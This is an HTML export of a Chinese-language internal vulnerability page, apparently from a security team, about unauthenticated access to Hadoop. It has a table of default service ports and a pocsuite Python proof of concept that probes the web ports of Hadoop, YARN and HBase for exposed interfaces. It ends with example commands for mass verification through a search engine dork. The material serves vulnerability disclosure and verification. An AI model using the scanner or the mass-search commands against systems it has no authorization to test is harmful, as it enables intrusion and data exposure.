                    
    
                    
    
                    
    
<!DOCTYPE html>
<html>
    <head>
        <title>查看源</title>
        <link rel="canonical" href="/pages/viewpage.action?pageId=$action.page.id" />
        <script>
window.WRM=window.WRM||{};window.WRM._unparsedData=window.WRM._unparsedData||{};window.WRM._unparsedErrors=window.WRM._unparsedErrors||{};
WRM._unparsedData["com.atlassian.plugins.atlassian-plugins-webresource-plugin:context-path.context-path"]="\u0022\u0022";
if(window.WRM._dataArrived)window.WRM._dataArrived();</script>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<!--[if lt IE 9]>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lt+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/e6a993fbd5f9a96d7f9e250269edb793-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/84659ac4c1e45bd2d0be562d3fdacb4d/_/download/contextbatch/css/_super/batch.css?conditionalComment=lte+IE+9" data-wrm-key="_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/d41d8cd98f00b204e9800998ecf8427e-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/259297d032f6c2eb68bc8778db0e9ca5/_/download/contextbatch/css/plugin.viewsource,-_super/batch.css" data-wrm-key="plugin.viewsource,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;presenterForConfluenceLicensed=true" data-wrm-key="page,-_super" data-wrm-batch-type="context" media="all">
<link type="text/css" rel="stylesheet" href="/s/05c9783eadef6eaefda0a664f5508375-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/606ed4d0b33417c38ad41c7240fd6541/_/download/contextbatch/css/page,-_super/batch.css?build-number=7201&amp;media=print&amp;presenterForConfluenceLicensed=true" media="print" data-wrm-key="page,-_super" data-wrm-batch-type="context">
<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<!--[if lte IE 9]>
<link type="text/css" rel="stylesheet" href="/s/af45f723c07cfe9ea790812c17f81a33-CDN/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/c890abc318d78efad182b82f6ccc55df/_/download/contextbatch/css/editor-content,-_super/batch.css?conditionalComment=lte+IE+9&amp;confluence.table.resizable=true&amp;confluence.view.edit.transition=true" data-wrm-key="editor-content,-_super" data-wrm-batch-type="context" media="all">
<![endif]-->
<link type="text/css" rel="stylesheet" href="/s/62670cd6c46dc9fd1c3fe85280142dff-T/zh_CN/7201/3d89a43db3618502ceb73a83aa0af888aa0a285a/5.1.8/_/download/batch/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource/ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource.css" data-wrm-key="ch.bitvoodoo.confluence.plugins.viewtracker:viewtracker-auto-tracking-web-item-web-resource" data-wrm-batch-type="resource" media="all">

    </head>

    <body class="mceContentBody aui-theme-default wiki-content fullsize">
        <p>&nbsp;</p>         <h1><strong>一、 漏洞描述</strong></h1><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作</p><p>Hadoop默认对外开放了多个端口服务如下：</p><table class="relative-table confluenceTable" style="width: 564.8px;"><colgroup><col style="width: 0.0px;" /><col style="width: 0.0px;" /></colgroup><tbody><tr><th class="confluenceTh">端口</th><th class="confluenceTh">描述</th></tr><tr><td class="confluenceTd">9000</td><td class="confluenceTd">fs.defaultFS,如 <a href="hdfs://172.25.40.171:9000">hdfs://172.25.40.171:9000</a></td></tr><tr><td class="confluenceTd">9001</td><td class="confluenceTd">dfs.namenode.rpc-address, DataNode会连接这个端口</td></tr><tr><td class="confluenceTd">50070</td><td class="confluenceTd">dfs.namenode.http-address</td></tr><tr><td class="confluenceTd">50470</td><td class="confluenceTd">dfs.namenode.https-address</td></tr><tr><td colspan="1" class="confluenceTd">50100</td><td colspan="1" class="confluenceTd">dfs.namenode.backup.address</td></tr><tr><td colspan="1" class="confluenceTd">50105</td><td colspan="1" class="confluenceTd">dfs.namenode.backup.http-address</td></tr><tr><td colspan="1" class="confluenceTd">50090</td><td colspan="1" class="confluenceTd">dfs.namenode.secondary.http-address 如 172.25.39.166:50090</td></tr><tr><td colspan="1" class="confluenceTd">50091</td><td colspan="1" class="confluenceTd">dfs.namenode.secondary.https-address</td></tr><tr><td colspan="1" class="confluenceTd">50020</td><td colspan="1" class="confluenceTd">dfs.datanode.ipc.address</td></tr><tr><td colspan="1" class="confluenceTd">50075</td><td colspan="1" class="confluenceTd">dfs.datanode.http.address</td></tr><tr><td colspan="1" class="confluenceTd">50475</td><td colspan="1" class="confluenceTd">dfs.datanode.https.address</td></tr><tr><td colspan="1" class="confluenceTd">50010</td><td colspan="1" class="confluenceTd">dfs.datanode.address, DataNode 的数据传输端口</td></tr><tr><td colspan="1" class="confluenceTd">8480</td><td colspan="1" class="confluenceTd">dfs.journalnode.rpc-address <span style="color: rgb(255,0,0);">http接口（原文错误） </span></td></tr><tr><td colspan="1" class="confluenceTd">8481</td><td colspan="1" class="confluenceTd">dfs.journalnode.https-address</td></tr><tr><td colspan="1" class="confluenceTd">8032</td><td colspan="1" class="confluenceTd">yarn.resourcemanager.address</td></tr><tr><td colspan="1" class="confluenceTd">8088</td><td colspan="1" class="confluenceTd">yarn.resourcemanager.webapp.address YARN的http端口</td></tr><tr><td colspan="1" class="confluenceTd">8090</td><td colspan="1" class="confluenceTd">yarn.resourcemanager.webapp.https.address</td></tr><tr><td colspan="1" class="confluenceTd">8030</td><td colspan="1" class="confluenceTd">yarn.resourcemanager.scheduler.address</td></tr><tr><td colspan="1" class="confluenceTd">8031</td><td colspan="1" class="confluenceTd">yarn.resourcemanager.resource-tracker.address</td></tr><tr><td colspan="1" class="confluenceTd">8033</td><td colspan="1" class="confluenceTd">yarn.resourcemanager.admin.address</td></tr><tr><td colspan="1" class="confluenceTd">8042</td><td colspan="1" class="confluenceTd">yarn.nodemanager.webapp.address</td></tr><tr><td colspan="1" class="confluenceTd">8040</td><td colspan="1" class="confluenceTd">yarn.nodemanager.localizer.address</td></tr><tr><td colspan="1" class="confluenceTd">8188</td><td colspan="1" class="confluenceTd">yarn.timeline-service.webapp.address</td></tr><tr><td colspan="1" class="confluenceTd">10020</td><td colspan="1" class="confluenceTd">mapreduce.jobhistory.address</td></tr><tr><td colspan="1" class="confluenceTd">19888</td><td colspan="1" class="confluenceTd">mapreduce.jobhistory.webapp.address</td></tr><tr><td colspan="1" class="confluenceTd">2888</td><td colspan="1" class="confluenceTd">ZooKeeper,如果是Leader，用来监听Follower的连接</td></tr><tr><td colspan="1" class="confluenceTd">3888</td><td colspan="1" class="confluenceTd">ZooKeeper用于leader选举</td></tr><tr><td colspan="1" class="confluenceTd">2181</td><td colspan="1" class="confluenceTd">ZooKeeper，用来监听客户端的连接</td></tr><tr><td colspan="1" class="confluenceTd">60010</td><td colspan="1" class="confluenceTd"><a href="http://hbase.master.info">hbase.master.info</a>.port, HMaster的http端口</td></tr><tr><td colspan="1" class="confluenceTd">60000</td><td colspan="1" class="confluenceTd">hbase.master.port HMaster的rpc端口</td></tr><tr><td colspan="1" class="confluenceTd">60030</td><td colspan="1" class="confluenceTd"><a href="http://hbase.regionserver.info">hbase.regionserver.info</a>.port HRegionServer的http端口</td></tr><tr><td colspan="1" class="confluenceTd">60020</td><td colspan="1" class="confluenceTd">hbase.regionserver.port HRegionServer的rpc端口</td></tr><tr><td colspan="1" class="confluenceTd">8080</td><td colspan="1" class="confluenceTd">hbbase.rest.port HBase REST server 的端口</td></tr><tr><td colspan="1" class="confluenceTd">10000</td><td colspan="1" class="confluenceTd">hive.server2.thrift.port</td></tr><tr><td colspan="1" class="confluenceTd">9083</td><td colspan="1" class="confluenceTd">hive.metastore.uris</td></tr></tbody></table><p><br /></p><p>未进行权限控制，存在未授权访问的问题。</p><p><br /></p><h1>二、漏洞利用</h1><p>由于hadoop通常在内网下使用，所以其本身设计上对于权限校验做的不足。如上述端口中的web类型，均可以直接访问到内容。获取服务器的部分数据信息</p><p><img class="confluence-embedded-image" height="250" src="/download/attachments/57262777/image2018-5-17_14-40-54.png?version=1&amp;modificationDate=1526539254000&amp;api=v2" data-image-src="/download/attachments/57262777/image2018-5-17_14-40-54.png?version=1&amp;modificationDate=1526539254000&amp;api=v2" data-unresolved-comment-count="0" data-linked-resource-id="57262781" data-linked-resource-version="1" data-linked-resource-type="attachment" data-linked-resource-default-alias="image2018-5-17_14-40-54.png" data-base-url="https://confluence.360es.cn" data-linked-resource-content-type="image/png" data-linked-resource-container-id="57262777" data-linked-resource-container-version="1" title="网络安全部公共空间 > Haddop未授权访问漏洞 > image2018-5-17_14-40-54.png" data-location="网络安全部公共空间 > Haddop未授权访问漏洞 > image2018-5-17_14-40-54.png" data-image-height="726" data-image-width="1364"></p><h1>三、漏洞验证</h1><p>相关poc如下（pocsuite）：</p><table class="wysiwyg-macro" data-macro-name="code" data-macro-id="7ff89da0-fc48-4726-9115-998e609b0824" data-macro-schema-version="1" style="background-image: url(/plugins/servlet/confluence/placeholder/macro-heading?definition=e2NvZGV9&amp;locale=zh_CN&amp;version=2); background-repeat: no-repeat;" data-macro-body-type="PLAIN_TEXT"><tr><td class="wysiwyg-macro-body"><pre>#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
# 命令行
from pocsuite import pocsuite_cli
# 验证模块
from pocsuite import pocsuite_verify
# 攻击模块
from pocsuite import pocsuite_attack
# 控制台模式
from pocsuite import pocsuite_console
# requests
from pocsuite.api.request import req
import urllib
# register
from pocsuite.api.poc import register
# report
from pocsuite.api.poc import Output, POCBase
# url转换host
from pocsuite.lib.utils.funs import url2ip


# 基础基类
class HadoopPOC(POCBase):
    vulID = '37'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    vulDate = '2018-05-11'  # 漏洞公开的时间,不知道就写今天
    author = 'songjianshan'  # PoC作者的大名
    createDate = '2018-05-11'  # 编写 PoC 的日期
    updateDate = '2018-05-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['http://0535code.com/article/20161124_1251.shtml']  # 漏洞地址来源,0day不用写
    name = 'Hadoop Unauthorized Access'  # PoC 名称
    appPowerLink = 'hadoop.apache.org'  # 漏洞厂商主页地址
    appName = 'Hadoop'  # 漏洞应用名称
    appVersion = 'all versions'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Hadoop 未授权访问
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    #cvss = u""  # 严重,高危,中危,低危

    # 指纹方法
    def _fingerprint(self):
        pass

    # 验证模块 pocsuite -r 1-redis.py -u 10.1.5.26 --verify
    def _verify(self):
        # 调用指纹方法
        result={}
        output = Output(self)
        scan_ports = {
                "50070", #dfs.namenode.http-address
                "50470", #dfs.namenode.https-address
                "50105", #dfs.namenode.backup.http-address
                "50090", #dfs.namenode.secondary.http-address
                "50091", #dfs.namenode.secondary.https-address
                "50075", #dfs.datanode.http.address
                "50475", #dfs.datanode.https.address
                "8480",  #dfs.journalnode.http-address
                "8088",  #yarn.resourcemanager.webapp.address
                "8090",     #yarn.resourcemanager.webapp.https.address
                "8042",  #yarn.nodemanager.webapp.address
                "8188",  #yarn.timeline-service.webapp.address
                "19888", #mapreduce.jobhistory.webapp.address
                "60010", #hbase.master.info.port, HMaster的http端口
                 "60030",#hbase.regionserver.info.port HRegionServer的http端口
                }
        vul_port = []
        for i in scan_ports:
            #print i
            vul_url = '%s:%s' % (self.url,i)
            try:
                response = req.get(str(vul_url)).text
                #print response
                if "hbase" in response.lower() or\
                    "url=/rs-status" in response.lower() or\
                    "hadoop" in response.lower():
                    vul_port.append(i)
            except:
                #print e
                pass
        if vul_port.__len__() > 0:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['Payload'] = "port:" + str(vul_port)
        return self.save_output(result)
        #pass

    # 攻击模块
    def _attack(self):
        return self._verify()
        #pass

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register(HadoopPOC)

"""
PoC 编写规范及要求说明 https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md

使用方法 https://github.com/knownsec/Pocsuite/blob/master/docs/translations/USAGE-zh.md

集成 Pocsuite https://github.com/knownsec/Pocsuite/blob/master/docs/INTEGRATE.md

钟馗之眼 批量验证
pocsuite -r 1-redis-getshell.py --verify --dork "redis"  --max-page 50 --search-type host --report report.html
pocsuite -r 1-redis-getshell.py --verify -f results.txt --threads 10 --report report.html
"""



</pre></td></tr></table><p><br /></p><p><br /></p>
        <p>&nbsp;</p>
    </body>
</html>
